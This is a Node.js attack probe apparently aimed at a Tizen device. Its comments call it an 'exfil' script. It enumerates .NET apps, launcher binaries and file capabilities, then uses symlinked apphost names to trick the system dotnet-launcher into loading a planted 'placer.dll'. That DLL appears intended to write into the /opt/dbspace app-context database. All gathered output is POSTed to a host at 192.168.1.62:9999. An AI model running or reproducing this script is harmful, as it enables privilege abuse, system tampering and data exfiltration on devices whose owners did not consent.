"use strict";

/* p55: dotnet-launcher invocation fix
   1. aoted_app.txt (what/where .NET apps live)
   2. broad search: .dll + .runtimeconfig.json in /opt /usr /home
   3. /opt/dotnet structure (runtime + framework dirs)
   4. dotnet-launcher file/strings (stripped? arg parse?) + inhouse
   5. dotnet-launcher invocation variants (DOTNET_ROOT, CORECLR_ROOT, stderr)
   exfil /p55info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var PLDIR = '/home/owner/share/tmp/sdk_tools';
var R = { ts: new Date().toISOString(), probe: 'p55', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p55info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 1) aoted_app.txt
  R.results.aoted = run('cat /opt/usr/home/owner/share/aoted_app.txt 2>&1; echo ===DOTNET_APPS===; cat /usr/bin/dotnet-apps.txt 2>&1', 15000);

  // 2) broad .NET app search
  R.results.find_apps = run('echo ===DLL===; find /opt/usr /opt/dotnet /usr/share/dotnet /home/owner -maxdepth 4 -name "*.dll" 2>/dev/null | grep -v node_modules | head -30; echo ===RTCFG===; find /opt /usr -maxdepth 5 -name "*.runtimeconfig.json" 2>/dev/null | head -20', 40000);

  // 3) /opt/dotnet structure
  R.results.opt_dotnet = run('echo ===OPT_DOTNET===; ls -la /opt/dotnet/ 2>&1 | head -20; echo ===RUNTIME===; ls -la /opt/dotnet/runtime/ 2>&1 | head -15; echo ===SHARED===; ls -la /usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0/ 2>&1 | head -20; echo ===FW===; ls -la /usr/share/dotnet/ 2>&1 | head; ls -la /usr/share/dotnet.tizen/ 2>&1 | head', 20000);

  // 4) dotnet-launcher file/strings
  R.results.dl_file = run('file /usr/bin/dotnet-launcher 2>&1; file /usr/bin/dotnet-launcher-inhouse 2>&1; echo ===DL_STR===; strings /usr/bin/dotnet-launcher 2>/dev/null | head -40; echo ===IH_STR===; strings /usr/bin/dotnet-launcher-inhouse 2>/dev/null | grep -iE "dll|runtimeconfig|hostfxr|coreclr|app|config|usage|error|\.json|/opt/|/usr" | head -40', 20000);

  // 5) invocation variants (capture stderr)
  R.results.try1 = run('DOTNET_ROOT=/usr/share/dotnet /usr/bin/dotnet-launcher ' + PLDIR + '/placer.dll caps 2>&1; echo e1=$?', 40000);
  R.results.try2 = run('CORECLR_ROOT=/usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0 /usr/bin/dotnet-launcher ' + PLDIR + '/placer.dll caps 2>&1; echo e2=$?', 40000);
  R.results.try3 = run('/usr/bin/dotnet-launcher 2>&1; echo e3=$?; echo ===HELP===; /usr/bin/dotnet-launcher --help 2>&1 | head -20; echo e4=$?', 30000);

  // 6) inhouse launcher: caps + strings (backup vector)
  R.results.inhouse = run('getcap /usr/bin/dotnet-launcher-inhouse 2>&1; echo ===IH_STR===; strings /usr/bin/dotnet-launcher-inhouse 2>/dev/null | head -40', 20000);

  // 7) error files from previous failed runs
  R.results.errfiles = run('ls -la /opt/usr/home/owner/share/ 2>&1 | grep -iE "dotnet|error"; echo ===CAT===; cat /opt/usr/home/owner/share/dotnet_error.* 2>&1 | head -40', 15000);

  // 8) apphost naming trick: an apphost named X looks for X.dll next to itself
  R.results.symlink_setup = run(
    'rm -rf /tmp/p55pl /tmp/p55pl2; mkdir -p /tmp/p55pl /tmp/p55pl2 2>&1; ' +
    'ln -sf /usr/bin/dotnet-launcher /tmp/p55pl/placer 2>&1; ' +
    'ln -sf ' + PLDIR + '/placer.dll /tmp/p55pl/placer.dll 2>&1; ' +
    'ln -sf ' + PLDIR + '/placer.runtimeconfig.json /tmp/p55pl/placer.runtimeconfig.json 2>&1; ' +
    'ln -sf ' + PLDIR + '/placer.deps.json /tmp/p55pl/placer.deps.json 2>&1; ' +
    'ln -sf /usr/bin/dotnet-launcher /tmp/p55pl2/dotnet-launcher 2>&1; ' +
    'ln -sf ' + PLDIR + '/placer.dll /tmp/p55pl2/dotnet-launcher.dll 2>&1; ' +
    'ln -sf ' + PLDIR + '/placer.runtimeconfig.json /tmp/p55pl2/dotnet-launcher.runtimeconfig.json 2>&1; ' +
    'ln -sf ' + PLDIR + '/placer.deps.json /tmp/p55pl2/dotnet-launcher.deps.json 2>&1; ' +
    'ls -la /tmp/p55pl/ 2>&1; echo ===PL2===; ls -la /tmp/p55pl2/ 2>&1', 25000);

  R.results.symlink1_caps = run('/tmp/p55pl/placer caps 2>&1; echo s1_exit=$?', 45000);
  R.results.symlink1_place = run('/tmp/p55pl/placer place 2>&1; echo s1p_exit=$?', 60000);
  R.results.symlink2_caps = run('/tmp/p55pl2/dotnet-launcher caps 2>&1; echo s2_exit=$?', 45000);

  // 9) verify
  R.results.verify = run('echo ===DST===; ls -la /opt/dbspace/.app-context.db-journal 2>&1; md5sum /opt/dbspace/.app-context.db-journal 2>&1; echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1; echo ===ERR_AFTER===; ls -la /opt/usr/home/owner/share/ 2>&1 | grep -iE "dotnet|error"; cat /opt/usr/home/owner/share/dotnet_error.* 2>&1 | head -40', 20000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
